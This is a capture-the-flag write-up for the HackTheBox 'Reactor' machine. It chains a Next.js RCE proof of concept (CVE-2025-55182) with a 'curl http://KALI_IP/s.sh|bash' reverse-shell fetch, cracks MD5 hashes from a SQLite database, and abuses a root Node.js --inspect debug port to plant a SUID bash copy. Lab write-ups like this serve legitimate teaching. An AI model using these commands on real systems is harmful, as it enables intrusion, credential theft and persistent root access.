# Reactor – HackTheBox Writeup

**Target:** Reactor (10.129.X.X)
**Attacker:** Kali Linux
**OS:** Linux (Ubuntu)
**Difficulty:** Easy
**Attack Path:** Nuclei CVE Detection → Next.js RCE (CVE-2025-55182) → SQLite Credential Dump → Node.js Debug Port SUID Exploit

---

## Recon

### Port Scan

```bash
sudo nmap -Pn -p- --min-rate 8000 10.129.X.X
```

Two ports open. SSH on 22 and something on 3000. Ran a service scan on just those two:

```bash
sudo nmap -Pn -p22,3000 -sC -sV 10.129.X.X
```

Port 3000 is running a Next.js web application. The response headers gave it away immediately: `X-Powered-By: Next.js` and `x-nextjs-cache: HIT`. That's a React framework running server side rendering. The HTML in the nmap output even showed the Next.js static chunks loading.

### Nuclei Scan

This is the first box where I used Nuclei, a vulnerability scanner I've been seeing in bug bounty YouTube videos for a while. Instead of manually identifying the software and googling for CVEs, Nuclei does it automatically by running thousands of detection templates against the target:

```bash
nuclei -target http://10.129.X.X:3000/
```

It found a critical hit right away: `[CVE-2025-55182] [http] [critical]`. Also confirmed the Next.js tech stack with `[tech-detect:next.js]`. That one command saved me all the manual enumeration I would normally do. Nuclei checks for known CVEs, misconfigurations, default credentials, and tech fingerprints all at once.

---

## Getting a Shell

### Next.js RCE (CVE-2025-55182)

Found a PoC called React2Shell on GitHub. Tested code execution first:

```bash
sudo python3 CVE-2025-55182.py -t http://10.129.X.X:3000/ -c "id"
```

```
[+] SUCCESS!
uid=999(node) gid=988(node) groups=988(node)
```

We're running as `node`. For the reverse shell I hosted a shell script on my Kali box and had the target pull and execute it:

```bash
# On Kali: create s.sh with reverse shell payload and serve it
python3 -m http.server 80

# Listener
sudo nc -lvnp 9001
```

```bash
sudo python3 CVE-2025-55182.py -t http://10.129.X.X:3000/ -c "curl http://KALI_IP/s.sh|bash"
```

Shell popped as `node`. The app lives in `/opt/reactor-app`.

---

## User Access

### Database Credentials

Checked the app directory and found a SQLite database sitting right there:

```bash
sqlite3 reactor.db .dump
```

Got two users out of it:

```
admin    | a203b22191d744a4e70ada5c101b17b8 | admin@reactor.htb
engineer | 39d97110eafe2a9a68639812cd271e8e | engineer@reactor.htb
```

Those are MD5 hashes. Threw `engineer`'s hash at CrackStation and got `reactor1` back instantly. Unsalted MD5 is basically plaintext.

### SSH as Engineer

```bash
ssh engineer@10.129.X.X
# Password: reactor1
```

We're in. Got a nice ASCII art banner about "ReactorWatch Core Monitoring System" and "Nuclear Dynamics Corp". The user is in some interesting groups:

```bash
id
# uid=1000(engineer) gid=1000(engineer) groups=1000(engineer),4(adm),24(cdrom),30(dip),46(plugdev),101(lxd)
```

User flag grabbed from the home directory.

---

## Privilege Escalation

### Finding the Node.js Debug Port

Checked what's listening internally:

```bash
ss -tunlp
```

Port 9229 on localhost caught my eye. Then checked running processes:

```bash
ps aux | grep node
```

```
root 1291 /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```

A Node.js process running as root with `--inspect` enabled. The `--inspect` flag opens a debugging port that lets you connect to the Node.js runtime and execute arbitrary JavaScript. And since the process is running as root, any code you run through the debugger runs as root too.

### Exploiting the Debug Port

Connected to the debug port using Node's built in inspector client:

```bash
node inspect 127.0.0.1:9229
```

First confirmed we're root:

```
debug> exec("process.getuid()")
0
```

UID 0 is root. Now the classic SUID bash trick. Copy bash to /tmp and set the SUID bit so anyone can run it as root:

```
debug> exec("process.mainModule.require('child_process').execSync('cp /bin/bash /tmp/r00t && chmod +s /tmp/r00t')")
```

Let me break that down. `process.mainModule.require('child_process')` loads Node's child process module. `.execSync()` runs a shell command and waits for it to finish. `cp /bin/bash /tmp/r00t` copies bash to a new file. `chmod +s` sets the SUID bit on that copy. Now when anyone runs `/tmp/r00t`, it executes with root's effective UID.

### Root

```bash
/tmp/r00t -p
```

The `-p` flag is critical. Without it, bash drops the SUID privileges for security. With `-p` it keeps the effective UID as root.

```bash
id
# uid=1000(engineer) gid=1000(engineer) euid=0(root) egid=0(root)
cat /root/root.txt
```

Box pwned.

---

## Attack Chain Summary

```
Nuclei scan → CVE-2025-55182 (Next.js RCE) detected
→ React2Shell PoC → shell as node
→ SQLite database dump → engineer:reactor1 (MD5 cracked)
→ SSH as engineer → user flag
→ Node.js --inspect on port 9229 running as root
→ node inspect → execSync → SUID bash → root
```

---

## What I Learned

Nuclei is a game changer for recon. Instead of manually identifying software, checking versions, and googling CVEs, one command scanned thousands of templates and found the critical CVE immediately. That said, understanding what the exploit does still matters. Nuclei finds the bug, you still need to understand how to chain it.

The Node.js `--inspect` flag is basically a backdoor if the process runs as root. It opens a debugging port that gives you full JavaScript execution in the context of the running process. Always check for ports 9229 and 9230 during enumeration. If a root process has `--inspect` enabled, that's instant root.

`process.mainModule.require('child_process').execSync()` is the Node.js equivalent of `system()` in C. Any time you can execute JavaScript in a Node.js context, you can run shell commands through this.

The SUID bash trick (`cp /bin/bash /tmp/r00t && chmod +s /tmp/r00t`) is cleaner than spawning a reverse shell when you already have SSH access. You create a persistent root shell that survives reboots and doesn't need a listener. Just remember the `-p` flag or bash drops the privileges.

MD5 hashes without salting are worthless as password storage. CrackStation cracked `engineer`'s hash in under a second because it was just a lookup in a precomputed table. No brute forcing needed.

*Educational purposes only. This is a HackTheBox machine in a controlled lab environment.*
